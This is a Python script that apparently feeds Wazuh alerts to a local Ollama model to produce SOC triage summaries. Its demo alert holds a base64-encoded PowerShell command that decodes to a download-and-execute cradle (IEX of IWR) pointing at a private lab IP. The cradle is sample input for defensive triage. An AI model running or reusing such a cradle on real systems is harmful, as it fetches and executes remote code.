#!/usr/bin/env python3
"""
SocForge — LLM Alert Triage
Uses a local Ollama model to generate a structured triage summary
from a Wazuh alert JSON.

Usage:
    python scripts/llm_triage.py <alert.json>
    cat alert.json | python scripts/llm_triage.py -
    python scripts/llm_triage.py --demo
"""

import json
import sys
import urllib.request
import urllib.error
from datetime import datetime

OLLAMA_URL = "http://localhost:11434/api/generate"
DEFAULT_MODEL = "gemma2:9b"

DEMO_ALERT = {
    "timestamp": "2026-08-07T14:23:47.000Z",
    "agent": {"name": "win01", "ip": "10.10.10.110"},
    "rule": {
        "id": "100121",
        "level": 12,
        "description": "Sigma T1059.001: PowerShell Base64 encoded command detected",
        "groups": ["powershell", "mitre_execution", "high_confidence"]
    },
    "data": {
        "win": {
            "eventdata": {
                "commandLine": "powershell.exe -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMAAuADYAMAAvAHQAZQBzAHQAJwApAA==",
                "newProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "parentProcessName": "C:\\Windows\\explorer.exe"
            }
        }
    },
    "mitre": {"id": "T1059.001", "tactic": "Execution"}
}

PROMPT_TEMPLATE = """You are a SOC analyst. Analyze this Wazuh security alert and provide a concise triage.

ALERT:
{alert_json}

Respond in this exact format:

SEVERITY: [CRITICAL/HIGH/MEDIUM/LOW]
VERDICT: [True Positive / False Positive / Needs Investigation]
SUMMARY: One sentence describing what happened.
IMMEDIATE ACTIONS:
- action 1
- action 2
MITRE: Technique and tactic in 5 words max.
"""


def call_ollama(prompt: str, model: str = DEFAULT_MODEL) -> str:
    payload = json.dumps({
        "model": model,
        "prompt": prompt,
        "stream": False
    }).encode()

    req = urllib.request.Request(
        OLLAMA_URL,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            result = json.loads(resp.read())
            return result.get("response", "").strip()
    except urllib.error.URLError as e:
        print(f"ERROR: Cannot reach Ollama at {OLLAMA_URL}")
        print(f"       Make sure 'ollama serve' is running")
        print(f"       Detail: {e}")
        sys.exit(1)


def format_alert_for_prompt(alert: dict) -> str:
    compact = {
        "time": alert.get("timestamp", "unknown"),
        "agent": alert.get("agent", {}).get("name", "unknown"),
        "agent_ip": alert.get("agent", {}).get("ip", "unknown"),
        "rule_id": alert.get("rule", {}).get("id", "unknown"),
        "rule_level": alert.get("rule", {}).get("level", "unknown"),
        "rule_desc": alert.get("rule", {}).get("description", "unknown"),
        "cmdline": alert.get("data", {}).get("win", {}).get(
            "eventdata", {}).get("commandLine", "N/A"),
        "process": alert.get("data", {}).get("win", {}).get(
            "eventdata", {}).get("newProcessName", "N/A"),
        "parent": alert.get("data", {}).get("win", {}).get(
            "eventdata", {}).get("parentProcessName", "N/A"),
        "mitre": alert.get("mitre", {})
    }
    return json.dumps(compact, indent=2)


def triage(alert: dict, model: str = DEFAULT_MODEL):
    print(f"\n{'='*60}")
    print(f"  SocForge LLM Triage — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  Model : {model}")
    print(f"  Agent : {alert.get('agent', {}).get('name', 'unknown')} "
          f"({alert.get('agent', {}).get('ip', '?')})")
    print(f"  Rule  : {alert.get('rule', {}).get('id')} — "
          f"level {alert.get('rule', {}).get('level')}")
    print(f"{'='*60}\n")

    prompt = PROMPT_TEMPLATE.format(alert_json=format_alert_for_prompt(alert))

    print("Analyzing...\n")
    response = call_ollama(prompt, model)
    print(response)
    print(f"\n{'='*60}")


def main():
    args = sys.argv[1:]
    model = DEFAULT_MODEL

    # parse --model flag
    if "--model" in args:
        idx = args.index("--model")
        if idx + 1 < len(args):
            model = args[idx + 1]
            args = [a for i, a in enumerate(args) if i not in (idx, idx + 1)]

    if not args or "--demo" in args:
        print("Running with demo alert (T1059.001 PowerShell encoded command)...")
        triage(DEMO_ALERT, model)
        return

    source = args[0]
    if source == "-":
        alert = json.load(sys.stdin)
    else:
        with open(source) as f:
            alert = json.load(f)

    triage(alert, model)


if __name__ == "__main__":
    main()
